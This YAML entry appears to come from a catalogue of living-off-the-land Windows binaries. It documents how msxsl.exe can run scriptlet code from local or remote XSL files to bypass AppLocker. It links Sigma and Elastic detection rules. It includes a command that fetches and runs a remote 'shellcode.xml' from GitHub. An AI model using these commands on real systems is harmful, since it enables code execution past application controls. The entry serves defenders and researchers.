---
Name: msxsl.exe
Description: Command line utility used to perform XSL transformations.
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: msxsl.exe customers.xml script.xsl
    Description: Run COM Scriptlet code within the script.xsl file (local).
    Usecase: Local execution of script stored in XSL file.
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: msxsl.exe customers.xml script.xsl
    Description: Run COM Scriptlet code within the script.xsl file (local).
    Usecase: Local execution of script stored in XSL file.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
    Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
    Usecase: Local execution of remote script stored in XSL script stored as an XML file.
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
    Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
    Usecase: Local execution of remote script stored in XSL script stored as an XML file.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
Full_Path:
  - Path:
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_xsl_script_processing.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
Resources:
  - Link: https://twitter.com/subTee/status/877616321747271680
  - Link: https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
